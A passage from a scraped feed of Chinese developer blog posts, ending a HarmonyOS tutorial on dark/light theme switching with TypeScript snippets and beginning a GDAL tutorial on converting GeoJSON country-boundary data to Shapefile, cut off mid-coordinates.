<li>每次切换都要重新计算所有颜色</li>
<li>组件需要频繁重绘</li>
<li>无法利用系统的优化机制</li>
</ul>
<h2 data-id="heading-15">四、高级功能扩展</h2>
<h3 data-id="heading-16">4.1 添加跟随系统选项</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 在ThemeUtils中添加</span>
<span class="hljs-keyword">async</span> <span class="hljs-title function_">setFollowSystem</span>(<span class="hljs-attr">enable</span>: <span class="hljs-built_in">boolean</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
  <span class="hljs-keyword">if</span> (enable) {
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setTheme</span>(<span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">SYSTEM</span>);
    
    <span class="hljs-comment">// 监听系统主题变化</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">appContext</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">'colorModeChange'</span>, <span class="hljs-function">(<span class="hljs-params">newMode: Configuration.ColorMode</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'系统主题已改变:'</span>, newMode);
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">notifyListeners</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">mapSystemMode</span>(newMode));
    });
  }
}

<span class="hljs-keyword">private</span> <span class="hljs-title function_">mapSystemMode</span>(<span class="hljs-attr">mode</span>: <span class="hljs-title class_">Configuration</span>.<span class="hljs-property">ColorMode</span>): <span class="hljs-title class_">ThemeMode</span> {
  <span class="hljs-keyword">switch</span> (mode) {
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">Configuration</span>.<span class="hljs-property">ColorMode</span>.<span class="hljs-property">COLOR_MODE_DARK</span>:
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">DARK</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">Configuration</span>.<span class="hljs-property">ColorMode</span>.<span class="hljs-property">COLOR_MODE_LIGHT</span>:
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">LIGHT</span>;
    <span class="hljs-attr">default</span>:
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">LIGHT</span>;
  }
}
</code></pre>
<h3 data-id="heading-17">4.2 添加动画效果</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 在切换主题时添加过渡动画</span>
<span class="hljs-keyword">async</span> <span class="hljs-title function_">toggleThemeWithAnimation</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
  <span class="hljs-comment">// 先设置半透明</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">applyOpacityAnimation</span>();
  
  <span class="hljs-comment">// 延迟切换主题</span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">toggleTheme</span>();
    
    <span class="hljs-comment">// 恢复不透明</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">removeOpacityAnimation</span>();
  }, <span class="hljs-number">300</span>);
}
</code></pre>
<h3 data-id="heading-18">4.3 多主题支持（节日主题等）</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 扩展支持更多主题</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">ExtendedThemeMode</span> {
  <span class="hljs-variable constant_">LIGHT</span> = <span class="hljs-string">'light'</span>,
  <span class="hljs-variable constant_">DARK</span> = <span class="hljs-string">'dark'</span>,
  <span class="hljs-variable constant_">SYSTEM</span> = <span class="hljs-string">'system'</span>,
  <span class="hljs-variable constant_">FESTIVAL</span> = <span class="hljs-string">'festival'</span>,  <span class="hljs-comment">// 节日主题</span>
  <span class="hljs-variable constant_">HIGH_CONTRAST</span> = <span class="hljs-string">'high_contrast'</span>  <span class="hljs-comment">// 高对比度</span>
}

<span class="hljs-comment">// 创建对应的资源目录</span>
<span class="hljs-comment">// resources/festival/element/color.json</span>
<span class="hljs-comment">// resources/high_contrast/element/color.json</span>
</code></pre>
<h2 data-id="heading-19">五、实践建议</h2>
<h3 data-id="heading-20">5.1 新项目：直接使用资源限定词方案</h3>
<ul>
<li>从第一天就建立<code>base/</code>和<code>dark/</code>目录</li>
<li>所有颜色使用<code>$r('app.color.xxx')</code></li>
<li>一个开关控制全部</li>
</ul>
<h3 data-id="heading-21">5.2 老项目迁移：三步走</h3>
<ol>
<li><strong>第一步</strong>：创建<code>dark/color.json</code>，复制所有颜色</li>
<li><strong>第二步</strong>：逐步替换硬编码为资源引用</li>
<li><strong>第三步</strong>：添加主题切换开关</li>
</ol>
<h3 data-id="heading-22">5.3 设计规范</h3>
<ol>
<li>使用语义化颜色名称：<code>primary_text</code>、<code>secondary_bg</code></li>
<li>建立颜色设计系统文档</li>
<li>定期同步设计和开发的颜色值</li>
</ol>
<h2 data-id="heading-23">总结</h2>
<p><strong>对于"一个开关控制白天/黑夜模式"的需求，鸿蒙的资源限定词方案是最佳选择。</strong></p>
<p>它提供了：</p>
<ul>
<li>✅ <strong>一键切换</strong>：一个开关控制全局</li>
<li>✅ <strong>自动适配</strong>：所有组件自动更新</li>
<li>✅ <strong>零代码侵入</strong>：业务组件无需修改</li>
<li>✅ <strong>高性能</strong>：系统级优化</li>
<li>✅ <strong>易维护</strong>：颜色集中管理</li>
<li>✅ <strong>可扩展</strong>：支持多主题</li>
</ul>
<p>而工具类方案需要：</p>
<ul>
<li>❌ 每个组件监听主题变化</li>
<li>❌ 手动更新所有颜色</li>
<li>❌ 性能损耗</li>
<li>❌ 维护困难</li>
</ul>
<p><strong>选择资源限定词方案，让你的主题切换像呼吸一样自然！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GIS 数据转换：使用 GDAL 将 GeoJSON 转换为 Shp 数据]]></title>    <link>https://juejin.cn/post/7589074117644894243</link>    <guid>https://juejin.cn/post/7589074117644894243</guid>    <pubDate>2025-12-29T13:21:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589074117644894243" data-draft-id="7589104492882952244" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GIS 数据转换：使用 GDAL 将 GeoJSON 转换为 Shp 数据"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-29T13:21:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GIS之路"/> <meta itemprop="url" content="https://juejin.cn/user/4346787284915481"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GIS 数据转换：使用 GDAL 将 GeoJSON 转换为 Shp 数据
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4346787284915481/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GIS之路
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T13:21:27.000Z" title="Mon Dec 29 2025 13:21:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<blockquote>
<p>❝</p>
<p>GeoJSON 作为一种通用的地理数据格式，可以很方便地用于共享交换。在 GIS 开发中，经常需要进行数据的转换处理，其中常见的便是将 GeoJSON 转换为 Shp 数据进行展示。</p>
</blockquote>
<p>在之前的文章中讲了如何使用<code>GDAL</code>或者<code>ogr2ogr</code>工具将<code>txt</code>以及<code>csv</code>文本数据转换为<code>Shp</code>格式，本篇教程在之前一系列文章的基础上讲解如何使用<code>GDAL</code>将<code>GeoJSON</code>转换为<code>Shp</code>数据。</p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">GDAL 简介</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">GDAL 下载安装</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">GDAL 开发起步</a></li>
</ul>
<p>如果你还没有看过，建议从以上内容开始。</p>
<h2 data-id="heading-1">1. 开发环境</h2>
<p>本文使用如下开发环境，以供参考。</p>
<p>时间：<code>2025年</code></p>
<p>系统：<code>Windows 11</code></p>
<p>Python：<code>3.11.7</code></p>
<p>GDAL：<code>3.11.1</code></p>
<h2 data-id="heading-2">2. 数据准备</h2>
<p><code>GeoJSON</code>是一种用于编码各种地理数据结构的格式，采用<code>JSON</code>方式表示。在<code>WebGIS</code>开发中，被广泛应用于数据传输和共享交换。</p>
<p>有关<code>GeoJSON</code>数据的详细介绍，请参考往期文章：<strong>GeoJSON 数据简介</strong></p>
<p><strong>如下是本文选取的部分国家边界范围的GeoJSON数据结构：</strong></p>
<pre><code class="hljs language-less" lang="less">{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">FeatureCollection</span>","<span class="hljs-selector-tag">features</span>":<span class="hljs-selector-attr">[{<span class="hljs-string">"type"</span>:<span class="hljs-string">"Feature"</span>,<span class="hljs-string">"id"</span>:<span class="hljs-string">"AFG"</span>,<span class="hljs-string">"properties"</span>:{<span class="hljs-string">"name"</span>:<span class="hljs-string">"Afghanistan"</span>},<span class="hljs-string">"geometry"</span>:{<span class="hljs-string">"type"</span>:<span class="hljs-string">"Polygon"</span>,<span class="hljs-string">"coordinates"</span>:[[[61.210817,35.650072]</span>,<span class="hljs-selector-attr">[62.230651,35.270664]</span>,<span class="hljs-selector-attr">[62.984662,35.404041]</span>,<span class="hljs-selector-attr">[63.193538,35.857166]</span>,<span class="hljs-selector-attr">[63.982896,36.007957]</span>,<span class="hljs-selector-attr">[64.546479,36.312073]</span>,<span class="hljs-selector-attr">[64.746105,37.111818]</span>,<span class="hljs-selector-attr">[65.588948,37.305217]</span>,<span class="hljs-selector-attr">[65.745631,37.661164]</span>,<span class="hljs-selector-attr">[66.217385,37.39379]</span>,<span class="hljs-selector-attr">[66.518607,37.362784]</span>,<span class="hljs-selector-attr">[67.075782,37.356144]</span>,<span class="hljs-selector-attr">[67.83,37.144994]</span>,<span class="hljs-selector-attr">[68.135562,37.023115]</span>,<span class="hljs-selector-attr">[68.859446,37.344336]</span>,<span class="hljs-selector-attr">[69.196273,37.151144]</span>,<span class="hljs-selector-attr">[69.518785,37.608997]</span>,<span class="hljs-selector-attr">[70.116578,37.588223]</span>,<span class="hljs-selector-attr">[70.270574,37.735165]</span>,<span class="hljs-selector-attr">[70.376304,38.138396]</span>,<span class="hljs-selector-attr">[70.806821,38.486282]</span>,<span class="hljs-selector-attr">[71.348131,38.258905]</span>,<span class="hljs-selector-attr">[71.239404,37.953265]</span>,<span class="hljs-selector-attr">[71.541918,37.905774]</span>,<span class="hljs-selector-attr">[71.448693,37.065645]</span>,<span class="hljs-selector-attr">[71.844638,36.738171]</span>,<span class="hljs-selector-attr">[72.193041,36.948288]</span>,<span class="hljs-selector-attr">[72.63689,37.047558]</span>,<span class="hljs-selector-attr">[73.260056,37.495257]</span>,<span class="hljs-selector-attr">[73.948696,37.421566]</span>,<span class="hljs-selector-attr">[74.980002,37.41999]</span>,<span class="hljs-selector-attr">[75.158028,37.133031]</span>,<span class="hljs-selector-attr">[74.575893,37.020841]</span>,<span class="hljs-selector-attr">[74.067552,36.836176]</span>,<span class="hljs-selector-attr">[72.920025,36.720007]</span>,<span class="hljs-selector-attr">[71.846292,36.509942]</span>,<span class="hljs-selector-attr">[71.262348,36.074388]</span>,<span class="hljs-selector-attr">[71.498768,35.650563]</span>,<span class="hljs-selector-attr">[71.613076,35.153203]</span>,<span class="hljs-selector-attr">[71.115019,34.733126]</span>,<span class="hljs-selector-attr">[71.156773,34.348911]</span>,<span class="hljs-selector-attr">[70.881803,33.988856]</span>,<span class="hljs-selector-attr">[69.930543,34.02012]</span>,<span class="hljs-selector-attr">[70.323594,33.358533]</span>,<span class="hljs-selector-attr">[69.687147,33.105499]</span>,<span class="hljs-selector-attr">[69.262522,32.501944]</span>,<span class="hljs-selector-attr">[69.317764,31.901412]</span>,<span class="hljs-selector-attr">[68.926677,31.620189]</span>,<span class="hljs-selector-attr">[68.556932,31.71331]</span>,<span class="hljs-selector-attr">[67.792689,31.58293]</span>,<span class="hljs-selector-attr">[67.683394,31.303154]</span>,<span class="hljs-selector-attr">[66.938891,31.304911]</span>,<span class="hljs-selector-attr">[66.381458,30.738899]</span>,<span class="hljs-selector-attr">[66.346473,29.887943]</span>,<span class="hljs-selector-attr">[65.046862,29.472181]</span>,<span class="hljs-selector-attr">[64.350419,29.560031]</span>,<span class="hljs-selector-attr">[64.148002,29.340819]</span>,<span class="hljs-selector-attr">[63.550261,29.468331]</span>,<span class="hljs-selector-attr">[62.549857,29.318572]</span>,<span class="hljs-selector-attr">[60.874248,29.829239]</span>,<span class="hljs-selector-attr">[61.781222,30.73585]</span>,<span class="hljs-selector-attr">[61.699314,31.379506]</span>,<span class="hljs-selector-attr">[60.941945,31.548075]</span>,<span class="hljs-selector-attr">[60.863655,32.18292]</span>,<span class="hljs-selector-attr">[60.536078,32.981269]</span>,<span class="hljs-selector-attr">[60.9637,33.528832]</span>,<span class="hljs-selector-attr">[60.52843,33.676446]</span>,<span class="hljs-selector-attr">[60.803193,34.404102]</span>,<span class="hljs-selector-attr">[61.210817,35.650072]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">AGO</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Angola</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">MultiPolygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[[16.326528,-5.87747]</span>,<span class="hljs-selector-attr">[16.57318,-6.622645]</span>,<span class="hljs-selector-attr">[16.860191,-7.222298]</span>,<span class="hljs-selector-attr">[17.089996,-7.545689]</span>,<span class="hljs-selector-attr">[17.47297,-8.068551]</span>,<span class="hljs-selector-attr">[18.134222,-7.987678]</span>,<span class="hljs-selector-attr">[18.464176,-7.847014]</span>,<span class="hljs-selector-attr">[19.016752,-7.988246]</span>,<span class="hljs-selector-attr">[19.166613,-7.738184]</span>,<span class="hljs-selector-attr">[19.417502,-7.155429]</span>,<span class="hljs-selector-attr">[20.037723,-7.116361]</span>,<span class="hljs-selector-attr">[20.091622,-6.94309]</span>,<span class="hljs-selector-attr">[20.601823,-6.939318]</span>,<span class="hljs-selector-attr">[20.514748,-7.299606]</span>,<span class="hljs-selector-attr">[21.728111,-7.290872]</span>,<span class="hljs-selector-attr">[21.746456,-7.920085]</span>,<span class="hljs-selector-attr">[21.949131,-8.305901]</span>,<span class="hljs-selector-attr">[21.801801,-8.908707]</span>,<span class="hljs-selector-attr">[21.875182,-9.523708]</span>,<span class="hljs-selector-attr">[22.208753,-9.894796]</span>,<span class="hljs-selector-attr">[22.155268,-11.084801]</span>,<span class="hljs-selector-attr">[22.402798,-10.993075]</span>,<span class="hljs-selector-attr">[22.837345,-11.017622]</span>,<span class="hljs-selector-attr">[23.456791,-10.867863]</span>,<span class="hljs-selector-attr">[23.912215,-10.926826]</span>,<span class="hljs-selector-attr">[24.017894,-11.237298]</span>,<span class="hljs-selector-attr">[23.904154,-11.722282]</span>,<span class="hljs-selector-attr">[24.079905,-12.191297]</span>,<span class="hljs-selector-attr">[23.930922,-12.565848]</span>,<span class="hljs-selector-attr">[24.016137,-12.911046]</span>,<span class="hljs-selector-attr">[21.933886,-12.898437]</span>,<span class="hljs-selector-attr">[21.887843,-16.08031]</span>,<span class="hljs-selector-attr">[22.562478,-16.898451]</span>,<span class="hljs-selector-attr">[23.215048,-17.523116]</span>,<span class="hljs-selector-attr">[21.377176,-17.930636]</span>,<span class="hljs-selector-attr">[18.956187,-17.789095]</span>,<span class="hljs-selector-attr">[18.263309,-17.309951]</span>,<span class="hljs-selector-attr">[14.209707,-17.353101]</span>,<span class="hljs-selector-attr">[14.058501,-17.423381]</span>,<span class="hljs-selector-attr">[13.462362,-16.971212]</span>,<span class="hljs-selector-attr">[12.814081,-16.941343]</span>,<span class="hljs-selector-attr">[12.215461,-17.111668]</span>,<span class="hljs-selector-attr">[11.734199,-17.301889]</span>,<span class="hljs-selector-attr">[11.640096,-16.673142]</span>,<span class="hljs-selector-attr">[11.778537,-15.793816]</span>,<span class="hljs-selector-attr">[12.123581,-14.878316]</span>,<span class="hljs-selector-attr">[12.175619,-14.449144]</span>,<span class="hljs-selector-attr">[12.500095,-13.5477]</span>,<span class="hljs-selector-attr">[12.738479,-13.137906]</span>,<span class="hljs-selector-attr">[13.312914,-12.48363]</span>,<span class="hljs-selector-attr">[13.633721,-12.038645]</span>,<span class="hljs-selector-attr">[13.738728,-11.297863]</span>,<span class="hljs-selector-attr">[13.686379,-10.731076]</span>,<span class="hljs-selector-attr">[13.387328,-10.373578]</span>,<span class="hljs-selector-attr">[13.120988,-9.766897]</span>,<span class="hljs-selector-attr">[12.87537,-9.166934]</span>,<span class="hljs-selector-attr">[12.929061,-8.959091]</span>,<span class="hljs-selector-attr">[13.236433,-8.562629]</span>,<span class="hljs-selector-attr">[12.93304,-7.596539]</span>,<span class="hljs-selector-attr">[12.728298,-6.927122]</span>,<span class="hljs-selector-attr">[12.227347,-6.294448]</span>,<span class="hljs-selector-attr">[12.322432,-6.100092]</span>,<span class="hljs-selector-attr">[12.735171,-5.965682]</span>,<span class="hljs-selector-attr">[13.024869,-5.984389]</span>,<span class="hljs-selector-attr">[13.375597,-5.864241]</span>,<span class="hljs-selector-attr">[16.326528,-5.87747]</span>]],<span class="hljs-selector-attr">[[[12.436688,-5.684304]</span>,<span class="hljs-selector-attr">[12.182337,-5.789931]</span>,<span class="hljs-selector-attr">[11.914963,-5.037987]</span>,<span class="hljs-selector-attr">[12.318608,-4.60623]</span>,<span class="hljs-selector-attr">[12.62076,-4.438023]</span>,<span class="hljs-selector-attr">[12.995517,-4.781103]</span>,<span class="hljs-selector-attr">[12.631612,-4.991271]</span>,<span class="hljs-selector-attr">[12.468004,-5.248362]</span>,<span class="hljs-selector-attr">[12.436688,-5.684304]</span>]]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">ALB</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Albania</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[20.590247,41.855404]</span>,<span class="hljs-selector-attr">[20.463175,41.515089]</span>,<span class="hljs-selector-attr">[20.605182,41.086226]</span>,<span class="hljs-selector-attr">[21.02004,40.842727]</span>,<span class="hljs-selector-attr">[20.99999,40.580004]</span>,<span class="hljs-selector-attr">[20.674997,40.435]</span>,<span class="hljs-selector-attr">[20.615,40.110007]</span>,<span class="hljs-selector-attr">[20.150016,39.624998]</span>,<span class="hljs-selector-attr">[19.98,39.694993]</span>,<span class="hljs-selector-attr">[19.960002,39.915006]</span>,<span class="hljs-selector-attr">[19.406082,40.250773]</span>,<span class="hljs-selector-attr">[19.319059,40.72723]</span>,<span class="hljs-selector-attr">[19.40355,41.409566]</span>,<span class="hljs-selector-attr">[19.540027,41.719986]</span>,<span class="hljs-selector-attr">[19.371769,41.877548]</span>,<span class="hljs-selector-attr">[19.304486,42.195745]</span>,<span class="hljs-selector-attr">[19.738051,42.688247]</span>,<span class="hljs-selector-attr">[19.801613,42.500093]</span>,<span class="hljs-selector-attr">[20.0707,42.58863]</span>,<span class="hljs-selector-attr">[20.283755,42.32026]</span>,<span class="hljs-selector-attr">[20.52295,42.21787]</span>,<span class="hljs-selector-attr">[20.590247,41.855404]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">ARE</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">United</span> <span class="hljs-selector-tag">Arab</span> <span class="hljs-selector-tag">Emirates</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[51.579519,24.245497]</span>,<span class="hljs-selector-attr">[51.757441,24.294073]</span>,<span class="hljs-selector-attr">[51.794389,24.019826]</span>,<span class="hljs-selector-attr">[52.577081,24.177439]</span>,<span class="hljs-selector-attr">[53.404007,24.151317]</span>,<span class="hljs-selector-attr">[54.008001,24.121758]</span>,<span class="hljs-selector-attr">[54.693024,24.797892]</span>,<span class="hljs-selector-attr">[55.439025,25.439145]</span>,<span class="hljs-selector-attr">[56.070821,26.055464]</span>,<span class="hljs-selector-attr">[56.261042,25.714606]</span>,<span class="hljs-selector-attr">[56.396847,24.924732]</span>,<span class="hljs-selector-attr">[55.886233,24.920831]</span>,<span class="hljs-selector-attr">[55.804119,24.269604]</span>,<span class="hljs-selector-attr">[55.981214,24.130543]</span>,<span class="hljs-selector-attr">[55.528632,23.933604]</span>,<span class="hljs-selector-attr">[55.525841,23.524869]</span>,<span class="hljs-selector-attr">[55.234489,23.110993]</span>,<span class="hljs-selector-attr">[55.208341,22.70833]</span>,<span class="hljs-selector-attr">[55.006803,22.496948]</span>,<span class="hljs-selector-attr">[52.000733,23.001154]</span>,<span class="hljs-selector-attr">[51.617708,24.014219]</span>,<span class="hljs-selector-attr">[51.579519,24.245497]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">ARG</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Argentina</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">MultiPolygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[[-65.5,-55.2]</span>,<span class="hljs-selector-attr">[-66.45,-55.25]</span>,<span class="hljs-selector-attr">[-66.95992,-54.89681]</span>,<span class="hljs-selector-attr">[-67.56244,-54.87001]</span>,<span class="hljs-selector-attr">[-68.63335,-54.8695]</span>,<span class="hljs-selector-attr">[-68.63401,-52.63637]</span>,<span class="hljs-selector-attr">[-68.25,-53.1]</span>,<span class="hljs-selector-attr">[-67.75,-53.85]</span>,<span class="hljs-selector-attr">[-66.45,-54.45]</span>,<span class="hljs-selector-attr">[-65.05,-54.7]</span>,<span class="hljs-selector-attr">[-65.5,-55.2]</span>]],<span class="hljs-selector-attr">[[[-64.964892,-22.075862]</span>,<span class="hljs-selector-attr">[-64.377021,-22.798091]</span>,<span class="hljs-selector-attr">[-63.986838,-21.993644]</span>,<span class="hljs-selector-attr">[-62.846468,-22.034985]</span>,<span class="hljs-selector-attr">[-62.685057,-22.249029]</span>,<span class="hljs-selector-attr">[-60.846565,-23.880713]</span>,<span class="hljs-selector-attr">[-60.028966,-24.032796]</span>,<span class="hljs-selector-attr">[-58.807128,-24.771459]</span>,<span 